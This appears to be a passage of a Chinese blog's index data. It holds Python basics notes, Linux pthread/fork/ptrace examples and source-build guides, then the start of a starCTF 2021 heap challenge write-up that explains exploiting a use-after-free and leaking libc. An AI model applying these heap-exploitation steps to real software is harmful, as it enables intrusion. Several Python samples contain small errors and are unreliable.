|\n  |                |     |                          |\n  +----------------+     +--------------------------+\n     b\"\".decode()               bytes.fromhex(\"\")\n\n```\n\n最左侧是str对象，中间是bytes对象。他俩之间的转换通过encode()与decode()函数，可以指定utf-8，gbk，ascii等编码方式。\n\n最右侧是hex表示的字符串，在python3中可通过bytes对象进行互相转换。\n\n转换示例如下：\n\n- str - bytes\n\n```shell\n>>> \"hello world\".encode()\nb'hello world'\n>>> \"hello world\".encode('gbk')\nb'hello world'\n>>> \"hello world\".encode('ascii')\t\t# 英文字符的编码就是它自己\nb'hello world'\n>>> '我'.encode()\nb'\\xe6\\x88\\x91'\n>>> '我'.encode('utf-8')\t\t\t# str.encode()的默认编码方式是utf-8\nb'\\xe6\\x88\\x91'\n>>> '我'.encode('gbk')\nb'\\xce\\xd2'\n>>> '我'.encode('ascii')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeEncodeError: 'ascii' codec can't encode character '\\u6211' in position 0: ordinal not in range(128)\n```\n\n- bytes - str\n\n```shell\n>>> b'\\xe6\\x88\\x91'.decode()\t\t# bytes.decode()的默认解码方式是utf-8\n'我'\n>>> b'\\xce\\xd2'.decode('gbk')\n'我'\n>>> b'\\xce\\xd2'.decode()\t\t\t# 以gbk编码的字节流，若未指定解码方式，默认以utf-8解码时会出错\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nUnicodeDecodeError: 'utf-8' codec can't decode byte 0xce in position 0: invalid continuation byte\n```\n\n- bytes - hex\n\n```shell\n>>> b'\\xe6\\x88\\x91'.hex()\n'e68891'\n>>> b'hello world'.hex()\n'68656c6c6f20776f726c64'\n>>> b'\\xce\\xd2'.hex()\n'ced2'\n```\n\n- hex - bytes\n\n```shell\n>>> bytes.fromhex('e68891')\nb'\\xe6\\x88\\x91'\n>>> bytes.fromhex('68656c6c6f20776f726c64')\nb'hello world'\n>>> bytes.fromhex('ced2')\nb'\\xce\\xd2'\n```\n\npython3中其他方式：\n\n```shell\nimport codecs\n>>> codecs.encode(b'aaa','hex')\nb'616161'\n>>> codecs.decode(b'\\x61\\x61\\x61')\n'aaa'\n>>> codecs.decode(b'\\x61\\x61\\x61','utf-8')\n'aaa'\n```\n\npython2中：\n\n```shell\n>>> '\\x61\\x61\\x63'.decode()\nu'aac'\n>>> '616263'.decode('hex')\n'abc'\n>>> 'abc'.encode('hex')\n'616263'\n```\n\n# python3模块\n\n- keyword\n\n```shell\n>>> import keyword\n>>> keyword.kwlist\n['False', 'None', 'True', '__peg_parser__', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']\n```\n\n- sys\n\n```python\nimport sys\nfor i in sys.argv:\n    print(i)\nfor i in sys.path:\n    print(i)\nprint(sys.path)\n\nfrom sys import argv,path\nfor i in argv:\n    print(i)\nfor i in path:\n    print(i)\nprint(path)\n```\n\n- os\n\n```shell\nimport os\nos.system('ls')\n```\n\n# 数据类型\n\n> Python 中有六个标准的数据类型：Number（数字），String（字符串），List（列表），Tuple（元组），Set（集合），Dictionary（字典）\n\n不可变数据：Number（数字），String（字符串），Tuple（元组）\n\n可变数据：List（列表），Set（集合），Dictionary（字典）\n\n```\n可通过type(xxx)查看数据类型\n```\n\n## Number\n\n> python3支持int，float，bool，complex\n\n```shell\n>>> 5 + 4  # 加法\n9\n>>> 4.3 - 2 # 减法\n2.3\n>>> 3 * 7  # 乘法\n21\n>>> 2 / 4  # 除法，得到一个浮点数\n0.5\n>>> 2 // 4 # 除法，得到一个整数\n0\n>>> 17 % 3 # 取余 \n2\n>>> 2 ** 5 # 乘方\n32\n```\n\n## String\n\n> 用双引号或单引号括起来，反斜杠`'\\'`作为转义字符和续行符\n\n```shell\n>>> print('Hello\\nwrold！')\nHello\nworld!\n>>> print(r'Hello\\nwrold！')\t\t# 使用r让反斜杠不转义\nHello\\nwrold！\t\t\t\t\t\n```\n\n- 字符串拼接：`+`和`*`\n\n```shell\n>>> print('str'+'ing', 'my'*3)\nstring mymymy\n```\n\n- 字符串索引：`[]`\n\n```shell\n>>> word = 'Python'\n>>> print(word[0], word[5])\nP n\n>>> print(word[-1], word[-6])\nn P\n```\n\n- 字符串切片：`[:]`\n\n```shell\n>>> word = 'ilovepython'\n>>> word[1:5]\n'love'\n>>> word[:]\n'ilovepython'\n>>> word[5:]\n'python'\n>>> word[-10:-6]\n'love'\n```\n\n## List\n\n> 使用方括号，逗号组成的元素列表，元素类型可不相同\n\n```sh\n>>> a = ['him', 25, 100, 'her']\n>>> print(a)\n['him', 25, 100, 'her']\n```\n\n- 列表串联拼接：`+`\n\n```shell\n>>> a = [1, 2, 3, 4, 5]\n>>> a + [6, 7, 8]\n[1, 2, 3, 4, 5, 6, 7, 8]\n```\n\n- 列表索引：`[]`\n\n```shell\n>>> a = ['him', 25, 100, 'her']\n>>> a[0]\n'him'\n>>> a[0] = 9\t\t\t#列表的元素可以更改\n>>> print(a)\n[9, 25, 100, 'her']\t\t\n>>> letters[:] = []\t\t#清除列表\n>>> letters\n```\n\n- 列表切片：`[:]`\n\n```sh\n>>> a = [1, 2, 3, 4, 5,6]\n>>> a[2:5] = [13, 14, 15]\t\t# 替换一些值\n>>> a\n[9, 2, 13, 14, 15, 6]\n>>> a[2:5] = []   \t\t# 删除\n>>> a\n[9, 2, 6]\n```\n\n- append() pop()等方法\n\n```shell\n# 使用append()方法在列表的末尾添加新项：\n>>> cubes = [1, 8, 27, 64, 125]\n>>> cubes.append(216)  # cube列表中添加新值\n>>> cubes.append(343)  #  cube列表中添加第七个值\n>>> cubes\n[1, 8, 27, 64, 125, 216, 343]\n```\n\n\n\n## Tuple\n\n> 使用方括号，逗号组成的元素元组，元素类型可不相同\n\n```shell\n>>> a = (1991, 2014, 'physics', 'math')\n>>> print(a, type(a), len(a))\n(1991, 2014, 'physics', 'math') <class 'tuple'> 4\n>>> tup1 = () \t\t# 空元组\n>>> tup2 = (20,)\t# 包含一个元素的元组，注意后面有逗号\n```\n\n- 元组拼接：`+`\n\n```shell\n>>> tup1, tup2 = (1, 2, 3), (4, 5, 6)\n>>> print(tup1+tup2)\n(1, 2, 3, 4, 5, 6)\n```\n\n- 元组索引：`[]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0])\n1\n```\n\n- 元组切片：`[:]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0:1])\n(1,)\n```\n\n- 删除元组\n\n```shell\n>>> del tup1\n```\n\n- 元组的内置函数\n\n```shell\n>>> tuple1 = ('Google', 'W3CSchool', 'Taobao')\n>>> len(tuple1)\t\t# 计算元组的元素个数\n3\n\n>>> tuple2 = ('5', '4', '8')\n>>> max(tuple2)\t\t# 返回元组中元素的最大值\n'8'\n\n>>> tuple2 = ('5', '4', '8')\n>>> min(tuple2)\t\t# 返回元组中元素的最小值\n'4'\n\n>>> list1= ['Google', 'Taobao', 'W3CSchool', 'Baidu']\n>>> tuple1=tuple(list1)\t\t# 将list列表转换为元组\n>>> tuple1\n('Google', 'Taobao', 'W3CSchool', 'Baidu')\n\n>>> import operator\n>>> dict1 = (1, 2, 3)\n>>> dict2 = ('a', 'b', 'c')\n>>> operator.eq(dict1, dict2)\t\t# 比较两个元组的元素\nFalse\n```\n\n## Set\n\n> 一个无序不重复元素的集合，使用大括号{}或set()函数创建\n>\n> tips：**set()创建空集合，{}创建空字典**\n\n```shell\n>>> student = {'Tom', 'Jim', 'Mary', 'Tom', 'Jack', 'Rose'}\n>>> print(student)   \t\t# 重复的元素被自动去掉\n{'Jim', 'Jack', 'Mary', 'Tom', 'Rose'}\n>>> 'Rose' in student \t\t # membership testing（成员测试）\nTrue\n>>> # set可以进行集合运算\n... \n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a\n{'a', 'b', 'c', 'd', 'r'}\n>>> a - b     \t\t# a和b的差集\n{'b', 'd', 'r'}\n>>> a | b    \t\t # a和b的并集\n{'l', 'm', 'a', 'b', 'c', 'd', 'z', 'r'}\n>>> a & b    \t\t # a和b的交集\n{'a', 'c'}\n>>> a ^ b    \t\t # a和b中不同时存在的元素\n{'l', 'm', 'b', 'd', 'z', 'r'}\n```\n\n## Dictionary\n\n> 一种映射类型（mapping type），在大括号{}中包含一些无序的键值对，**关键字必须使用不可变类型**\n\n```shell\n>>> tel = {} \t\t \t\t# 创建空字典\n>>> tel = {'Jack':1557, 'Tom':1320, 'Rose':1886}\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Rose': 1886}\n>>> tel['Jack']   \t\t\t# 通过key查询\n1557\n>>> del tel['Rose']  \t\t# 删除一个键值对\n>>> tel['Mary'] = 4127  \t# 添加一个键值对\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Mary': 4127}\n>>> list(tel.keys())  \t\t# 返回所有key组成的list\n['Tom', 'Jack', 'Mary']\n>>> sorted(tel.keys()) \t\t# 按key排序\n['Jack', 'Mary', 'Tom']\n>>> 'Tom' in tel       \t\t# 成员测试\nTrue\n>>> 'Mary' not in tel  \t\t# 成员测试\nFalse\n```\n\n使用dict()构造函数从sequence中构造字典，也可进行推导。（string、list 和 tuple 都属于 sequence（序列））\n\n```shell\n>>> dict([('sape', 4139), ('guido', 4127), ('jack', 4098)])\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n\n>>> {x: x**2 for x in (2, 4, 6)}\n{2: 4, 4: 16, 6: 36}\n\n>>> dict(sape=4139, guido=4127, jack=4098)\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n```\n\n- 删除字典元素\n\n```python\ndict = {'Name': 'W3CSchool', 'Age': 7, 'Class': 'First'}\n\ndel dict['Name'] \t\t# 删除键 'Name'\ndict.clear()     \t\t# 删除字典\ndel dict         \t\t# 删除字典\n```\n\n字典类型有一些内置函数，例如 clear()、keys()、values() 等。\n\n# 语法及API\n\n## 条件控制\n\n```python\nif condition_1:\n    statement_block_1\nelif condition_2:\n    statement_block_2\nelse:\n    statement_block_3\n```\n\n## 循环\n\n```python\nwhile 判断条件：\n    statements\n```\n\n```python\nfor <variable> in <sequence>:\n    <statements>\nelse:\n    <statements>\n```\n\n```python\n# 使用break跳出当前循环体\nedibles = [\"ham\", \"spam\",\"eggs\",\"nuts\"]\n\nfor food in edibles:\n    if food == \"spam\":\n        print(\"No more spam please!\")\n        break\n    print(\"Great, delicious \" + food)\n    else:\n        print(\"I am so glad: No spam!\")\n\nprint(\"Finally, I finished stuffing myself\")\n```\n\n- range()函数\n\n```shell\n>>> for i in range(5):\n...     print(i)\n...\n0\n1\n2\n3\n4\n\n>>> for i in range(5,9) :\n  print(i) \n5\n6\n7\n8\n\n>>> for i in range(0, 10, 3) :\n    print(i)\n0\n3\n6\n9\n\n>>> for i in range(-10, -100, -30) :\n   print(i)\n-10\n-40\n-70\n\n>>> list(range(5))\n[0, 1, 2, 3, 4]\n```\n\n- continue和pass\n\n## 迭代器与生成器\n\n> 迭代器的两个基本方法：iter()和next()\n\n```shell\n# 字符串，列表或元组对象都可用于创建迭代器\n>>> list=[1,2,3,4]\n>>> it = iter(list)    # 创建迭代器对象\n>>> print(next(it))   # 输出迭代器的下一个元素\n1\n>>> print(next(it))\n2\n\n# 使用for语句遍历迭代器对象\nlist=[1,2,3,4]\nit = iter(list)    # 创建迭代器对象\nfor x in it:\n    print(x, end=\" \")\n# 执行结果为：1 2 3 4\n\n# 使用next函数\nimport sys         # 引入 sys 模块\nlist=[1,2,3,4]\nit = iter(list)    # 创建迭代器对象\nwhile True:\n    try:\n        print(next(it))\n    except StopIteration:\n        sys.exit()\n#执行完的输出\n1\n2\n3\n4\n```\n\n> 生成器是使用了yield的函数\n\n在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值。并在下一次执行 next() 方法时从当前位置继续运行。\n\n```python\nimport sys\n\ndef fibonacci(n): # 生成器函数 - 斐波那契\n    a, b, counter = 0, 1, 0\n    while True:\n        if (counter > n): \n            return\n        yield a\n        a, b = b, a + b\n        counter += 1\nf = fibonacci(10) # f 是一个迭代器，由生成器返回生成\n\nwhile True:\n    try:\n        print (next(f), end=\" \")\n    except StopIteration:\n        sys.exit()\n```\n\n输出：\n\n```\n0 1 1 2 3 5 8 13 21 34 55\n```\n\n## 函数\n\n```python\ndef  函数名（参数列表）：\n\t函数体\n```\n\n- 不定长参数：`*`\n\n```python\ndef printinfo( arg1, *vartuple ):\n   \"打印任何传入的参数\"\n   print \"输出: \"\n   print arg1\n   for var in vartuple:\n      print var\n   return;\n \n# 调用printinfo 函数\nprintinfo( 10 );\nprintinfo( 70, 60, 50 );\n\n# 输出:\n# 10\n# 输出:\n# 70\n# 60\n# 50\n```\n\n- 匿名函数：`lambda`\n\n> lambda [arg1 [,arg2,.....argn]]:expression\n\n```python\nsum = lambda arg1, arg2: arg1 + arg2;\n \n#调用sum函数\nprint \"Value of total : \", sum( 10, 20 )\nprint \"Value of total : \", sum( 20, 20 )\n```\n\n## 输入和输出\n\n输入：input()，read()\n\n输出：print()，write()，str.format()，sys.stdout()\n\n```shell\n>>> for x in range(1, 11):\n...     print('{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x))\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n>>> print('bbb'.ljust(10),'==>','ccc'.rjust(10))\t\t# str.rjust()与str.ljust()\nbbb        ==>        ccc\n\n>>> print('aaa'.center(10),'bbb'.center(10))\t\t\t# str.center()\n   aaa        bbb \n   \n>>> print('aaa'.zfill(10))\t\t\t\t# st=r.zfill()\n0000000aaa\n```\n\n将值转换为字符串：repr()，str()\n\n```\n>>> repr('\\x64')\n\"'d'\"\n>>> str('\\x64')\n'd'\n```\n\n## 读写文件\n\n> open() 将会返回一个 file 对象\n\n```python\nopen(filename, mode)\t\t\t\t\t# 若不提供mode的话，默认以只读方式打开\n>>> f = open('/tmp/workfile', 'w')     # 以只写的方式打开文件\n>>> f = open('/tmp/workfile','r')\t\t# 以只读的方式打开文件\n>>> f = open('/tmp/workfile','a')\t\t# 以追加的方式打开文件\n>>> f = open('/tmp/workfile','r+')\t\t# 以读写的方式打开文件\n```\n\nf.read(n)：读取文件内容，以字符串或字节对象返回。n指定读取大小，若n为0或负数则返回文件所有内容\n\nf.readline()：读取文件中的一行'\\n'，如果返回空字符串则说明已经读取到最后一行\n\n```shell\n>>> f.readline()\t\n'This is the first line of the file.\\n'\n>>> f.readline()\n'Second line of the file\\n'\n>>> f.readline()\n''\n```\n\nf.readlines() ：返回文件包含的所有行，返回的是一个list。\n\n```shell\n>>> f.readlines()\n['line1 line11\\n', 'line2 line22\\n', 'line3 line33\\n']\n>>> f.readlines(20)\n['line1 line11\\n', 'line2 line22\\n']\n```\n\nf.write()：f.write(string) 将 string 写入到文件中, 然后返回写入的字符数\n\n```shell\n>>> f.write('This is a test\\n')\n15\n\n>>> value = ('the answer', 42)\t\t# 若写入的不是字符串，则需要先进行转换\n>>> s = str(value)\n>>> f.write(s)\n18\n```\n\nf.tell()：返回文件对象当前所处的位置，是从文件开头算起的字节数。\n\nf.seek()：改变文件当前位置。 `f.seek(offset, from_what)`\n\n```\nfrom_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾，例如：\n\nseek(x, 0) ： 从起始位置即文件首行首字符开始移动 x 个字符\nseek(x, 1) ： 表示从当前位置往后移动x个字符\nseek(-x, 2)：表示从文件的结尾往前移动x个字符\n```\n\nf.close()：关闭文件。\n\n# 标准库概览\n\n[W3Cschool-标准库概览](https://www.w3cschool.cn/python3/python3-stdlib.html)\n\n# tips\n\n- 复合赋值\n\n```python\n# Fibonacci series: 斐波纳契数列\n# 两个元素的总和确定了下一个数\na, b = 0, 1\nwhile b < 10:\n    print(b)\n    a, b = b, a + b;\n```\n\n- end关键字\n\n>  用于将结果输出到同一行，或者在输出的末尾添加不同的字符\n\n```python\na, b = 0, 1\nwhile b < 1000:\n    print(b,end=',')\n    a, b = b, a + b;\n```\n\n- int与hex\n\n```\nhex(十进制数)：将10进制数转换成16进制，并以字符串形式表示。\n\nint(str/十进制数,base)：将字符串或数字转换成整形。base为进制数，默认为十进制，指定base时第一个参数只能是字符串。\n```\n\n","categories":["编程语言"]},{"title":"linux下多线程编程与调试","url":"/2021/01/23/pthread-fork-ptrace/","content":"\n# linux下多线程编程之pthread\n\n\n`pthread_self()` 可获取当前线程号。\n\n`getpid()` 可获取当前进程号。\n\n`pthread_join(t1, NULL);` 等待子线程执行完。\n\n`pthread_exit(\"a string\");` 在线程中使用，线程返回后，会将 \"a string\" 字符串给主进程 `pthread_join(t1, &result)` 中的result。\n\n如下示例代码可以看出这以上各函数的作用：\n\n```c\n//gcc test.c lpthread -o test\n//test.c\n#include <stdio.h>   //printf\n#include <pthread.h> //pthread_xxx\n\nvoid *thread_func(void *p)\n{\n    long i = (long)p;\n    pthread_t tid = pthread_self();\n    for (int j = 0; j < 5; j++)\n    {\n        printf(\"thread id is:%lu --- %d --- %d\\n\",tid,i,j);\n    }\n\n    return NULL;\n}\n\nint main()\n{\n    pthread_t t1, t2;\n    pid_t pid = getpid();\n    printf(\"PID is: %lu\\n\",pid);\n    pthread_create(&t1, 0, thread_func, (void *)1);\n    pthread_create(&t2, 0, thread_func, (void *)2);\n\n//    pthread_join(t1, NULL);\n//    pthread_join(t2, NULL);\n\n    return 0;\n}\n```\n\n参考：\n\n[pthread常用函数](https://zhuanlan.zhihu.com/p/86208167)\n\n[pthread并行编程入门](https://segmentfault.com/a/1190000020655588)\n\n# linux下多进程编程之fork\n\nfork()函数通过系统调用创建一个与原来进程几乎完全相同的进程。\n- 在父进程中，fork返回新创建子进程的进程ID；\n- 在子进程中，fork返回0；\n- 如果出现错误，fork返回一个负值；\n如下代码可以帮助我们了解fork()\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main () \n{ \n\tpid_t fpid; \n\tint count=0;\n\tfpid=fork(); \n\tif (fpid < 0) \n\t\tprintf(\"error in fork!\\n\"); \n\telse if (fpid == 0) {\n\t\tprintf(\"i am the child process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n\t}\n\telse {\n\t\tprintf(\"i am the parent process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n        count++;\n\t}\n\tprintf(\"count is: %d\\n\",count);\n\treturn 0;\n}\n```\n\n参考：\n\n[linux中fork（）函数详解（原创！！实例讲解）](https://blog.csdn.net/jason314/article/details/5640969)\n\n\n# ptrace\n\n- ptrace追踪子进程系统调用号\n\n```c\n// 64 bit system\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\nint main()\n{\n    pid_t child;\n    long orig_eax;\n    long test;\n    child = fork();\n    if(child == 0) {\n        ptrace(PTRACE_TRACEME, 0, NULL, NULL);\n        execl(\"/bin/ls\", \"ls\", NULL);\n    }\n    else {\n        wait(NULL);\n        orig_eax = ptrace(PTRACE_PEEKUSER,child, 8 * ORIG_RAX,NULL);\n        printf(\"The child made a system call %ld\\n\",orig_eax);\n        ptrace(PTRACE_CONT, child, NULL, NULL);\n    }\n    return 0;\n}\n```\n- ptrace进程附着调试\n\n```c\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\n\nint main(int argc, char *argv[])\n{   \n    pid_t traced_process;\n    struct user_regs_struct regs;\n    long ins;\n    if(argc != 2) {\n        printf(\"Usage: %s <pid to be traced> \",argv[0]);\n        exit(1);\n    }\n    traced_process = atoi(argv[1]);\n    ptrace(PTRACE_ATTACH, traced_process, \n           NULL, NULL);\n    wait(NULL);\n    ptrace(PTRACE_GETREGS, traced_process, \n           NULL, &regs);\n    printf(\"regs.rip is: 0x%llx\\n\",regs.rip);\n    ins = ptrace(PTRACE_PEEKTEXT, traced_process, \n                 regs.rip, NULL);\n    printf(\"RIP: %llx Instruction executed: %lx\\n\",regs.rip, ins);\n    ptrace(PTRACE_DETACH, traced_process, \n           NULL, NULL);\n    return 0;\n}\n```\n参考：\n\n[Linux沙箱之ptrace](https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/)\n\n[ptrace运行原理及使用详解](https://blog.csdn.net/edonlii/article/details/8717029)","categories":["编程语言"]},{"title":"linux下的源码编译","url":"/2021/01/20/source-code-compile/","content":"\n# 源码编译\n\n把这篇参考文章[linux下源代码的编译安装入门](https://www.jianshu.com/p/39101098ebbe)完整看并动手实践下来，对源码编译就有了宏观上粗略的了解。\n\n另外还需要了解多级目录下makefile的编写及编译过程。\n\n## 三步走\n\n### configure - 检查\n\n```shell\nconfigure --prefix=dir/\n# 指定安装目录dir/，后续make install时会安装到dir/目录下（不指定的话，默认是/usr/local/bin目录）\n# 安装的二进制文件存放在dir/bin/目录下\n# 安装的资源文件存放在dir/share/目录下\n```\n\n```shell\nconfigure --help\n# 查看详细的帮助说明，如--sys-config=xxx进行参数设定，--with/--enable/--without/--disable等对编译过程进行控制\n```\n\n### make - 编译\n\n> 除了有些用perl或python编写的软件（使用perl或python进行编译），大部分源代码都是需要通过make进行编译的\n\nmake是linux开发套件里面自动化编译的一个控制程序，它通过makefile里的编译规则自动调用gcc，ld等进行编译。makefile可以自行编写，也可以通过configure脚本根据给定的参数和系统环境生成。\n\n### make install - 安装\n\n> make通过加'参数'`make install`或`make uninstall`来进行安装或卸载，若不加'参数'则表示进行默认的源代码编译\n\n默认情况下，通常需要root权限来运行`make install`，因为待写入目录可能权限较高（如/usr/local/bin）。\n\n对部分软件而言，需要在`make install`前先运行`make check`或`make test`来进行一些测试。\n\n## 编译qemu\n\n下载qemu源码\n\n```shell\nwget https://download.qemu.org/qemu-5.2.0.tar.xz\ntar Jxvf qemu-5.2.0.tar.xz\ncd qemu-5.2.0\ncd ..\nmkdir -p build-qemu\n```\n\n安装ninja\n\n```shell\nsudo apt install re2c\ngit clone git://github.com/ninja-build/ninja.git && cd ninja\n./configure.py --bootstrap\ncp ninja /usr/bin/\nninja --version\n```\n\n编译qemu\n\n```shell\nsudo apt install pkg-config libglib2.0-dev libmount-dev python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential autoconf automake libfreetype6-dev libtheora-dev libtool libvorbis-dev pkg-config texinfo zlib1g-dev unzip cmake yasm libx264-dev libmp3lame-dev libopus-dev libvorbis-dev libxcb1-dev libxcb-shm0-dev libxcb-xfixes0-dev pkg-config texinfo wget zlib1g-dev \ncd build-qemu/\n../qemu/configure --enable-debug\nmake -j4\n```\n\n\n\n## 离线编译安装gcc-5.4.0\n\n1、下载gcc版本：[gcc网址](http://ftp.gnu.org/gnu/gcc/)\n\n2、解压到本地，新建build目录，执行configure。此时会报错，因为依赖条件不满足，从报错中获取GMP,MPFR和MPC的版本，然后分别安装。\n\n```\ntar zxvf gcc-5.4.0.tar.gz\ncd gcc-5.4.0\nmkdir build\ncd build\n../configure\n```\n\n报错信息：\n\n```\nconfigure: error: Building GCC requires GMP 4.2+, MPFR 2.4.0+ and MPC 0.8.0+.\n```\n\n3、安装依赖\n\nhttp://ftp.gnu.org/gnu/，该目录下有GMP,MPFR和MPC目录，分别进入下载需要的版本。（按顺序安装哦）\n\n3.1 安装GMP\n\n```\n$ tar -jxvf gmp-4.3.2.tar.gz\n$ cd gmp-4.3.2\n$ mkdir temp\n$ cd temp\n$ ../configure --prefix=/usr/local/gmp-4.3.2\n$ make\n$ make install\n```\n\n3.2 安装MPFR\n\n```\n$ tar -zxvf mpfr-3.0.0.tar.gz \n$ cd mpfr-3.0.0\n$ mkdir temp\n$ cd temp\n\n$ ../configure --prefix=/usr/local/mpfr-3.0.0 --with-gmp=/usr/local/gmp-4.3.2\n$ make\n$ make install\n```\n\n3.3 安装MPC\n\n```\n$ tar -zxvf mpc-1.0.2.tar.gz\n$ cd mpc-1.0.2\n$ mkdir temp\n$ cd temp\n\n$ ../configure --prefix=/usr/local/mpc-1.0.2 --with-gmp=/usr/local/gmp-4.3.2 --with-mpfr=/usr/local/mpfr-3.0.0\n$ make\n$ make install\n```\n\n3.4 添加库路径到/etc/ld.so.conf中\n\n```\nvim /etc/ld.so.conf\n#添加如下内容：\n/usr/local/gmp-4.3.2/lib\n/usr/local/mpfr-3.0.0/lib\n/usr/local/mpc-1.0.2/lib\n#添加完后执行：\nldconfig\n```\n\n4 安装gcc\n\n第2步中已经解压完毕，进入build目录\n\n```\n../configure --prefix=/usr/local/gcc-5.4.0 --with-gmp=/usr/local/gmp-4.3.2 --with-mpfr=/usr/local/mpfr-3.0.0 --with-mpc=/usr/local/mpc-1.0.2 \n\nmake \nmake install\n```\n\n\n\n\n\n","categories":["编译"]},{"title":"starCTF 2021 babyheap","url":"/2021/01/17/starctf-babyheap/","content":"\n# 1 分析\n\n[babyheap](starctf-babyheap.zip)\n\n题目包含一个可执行程序和一个libc。\n\n程序提供了六个功能，在delete中free后未将指针置NULL，导致UAF。\n\n## tcache\n\nlibc版本是2.27，free后的chunk会被扔到tcache中。由于本题所用的libc做了改动，无法通过double free形成一个环状以达到任意地址写。\n\nadd一次，delete两次后，堆空间状态如下。可以看到tcachebins中只有一个free chunk，并且其bk的位置被写入了0x0000555555757010。就是这个标志导致无法free两次成一个环状，可通过edit将该处写成别的值，绕过检查。但是由于edit无法写到fd的位置，所以还是无法简单地用tcache double free的方法利用。\n\n```shell\ngef➤  heap bins\n──────────────────────────────────────────── Tcachebins for arena 0x7ffff7dcfc40 ────────────────────────────────────────────\nTcachebins[idx=1, size=0x30] count=1  ←  Chunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE) \n───────────────────────────────────────────── Fastbins for arena 0x7ffff7dcfc40 ─────────────────────────────────────────────\nFastbins[idx=0, size=0x20] 0x00\nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\n────────────────────────────────────────── Unsorted Bin for arena '*0x7ffff7dcfc40' ──────────────────────────────────────────\n[+] Found 0 chunks in unsorted bin.\n─────────────────────────────────────────── Small Bins for arena '*0x7ffff7dcfc40' ───────────────────────────────────────────\n[+] Found 0 chunks in 0 small non-empty bins.\n─────────────────────────────────────────── Large Bins for arena '*0x7ffff7dcfc40' ───────────────────────────────────────────\n[+] Found 0 chunks in 0 large non-empty bins.\ngef➤  heap chunks\nChunk(addr=0x555555757010, size=0x250, flags=PREV_INUSE)\n    [0x0000555555757010     00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x555555757260, size=0x30, flags=PREV_INUSE)\n    [0x0000555555757260     00 00 00 00 00 00 00 00 10 70 75 55 55 55 00 00    .........puUUU..]\nChunk(addr=0x555555757290, size=0x20d80, flags=PREV_INUSE)  ←  top chunk\ngef➤  x/10gx 0x0000555555757260\n0x555555757260:\t0x0000000000000000\t0x0000555555757010\n0x555555757270:\t0x0000000000000000\t0x0000000000000000\n0x555555757280:\t0x0000000000000000\t0x0000000000020d81\n0x555555757290:\t0x0000000000000000\t0x0000000000000000\n0x5555557572a0:\t0x0000000000000000\t0x0000000000000000\n```\n\n## fastbin\n\ntcache中无法利用，那么把tcache的一条链填满，让free chunk进入fastbin中。\n\n题目源码里leaveyouname()函数中会申请一个0x400的超大chunk，申请超大chunk时会触发fastbin中的free chunk合并——跟top chunk挨着的会合并到top chunk中然后分配出去，不跟top chunk挨着的会合并起来放到unsortedbin或者smallbin中。\n\n进入unsortedbin或者smallbin中的堆块会有main_arena的地址信息，可以通过泄露这个地址进而泄露libc。\n\nadd 16个不同的index（从0到15），然后全部delete掉，得到如下bin状态。0~6在tcache中，7~15在fastbin中。此时申请大堆块，会将7~15全部合并到top chunk，然后分配给新的申请。这样将不会有chunk进入unsortedbin或者smallbin。所以需要在7~15中保持一个chunk不释放，将原本空间连续的chunk分成两部分。\n\n比如，将index为10的chunk不delete。这样在申请大堆块时，7~9会合并到smallbin中，11~15会合并到top chunk中然后分配给新的申请。\n\n```shell\ngef➤  heap bins\n───────────────────── Tcachebins for arena 0x7fd435ee1c40 ─────────────────────\nTcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0x55e338453320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384532a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453280, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453260, size=0x20, flags=PREV_INUSE) \n────────────────────── Fastbins for arena 0x7fd435ee1c40 ──────────────────────\nFastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55e338453440, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453420, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453400, size=0x20, flags=PREV_INUSE)  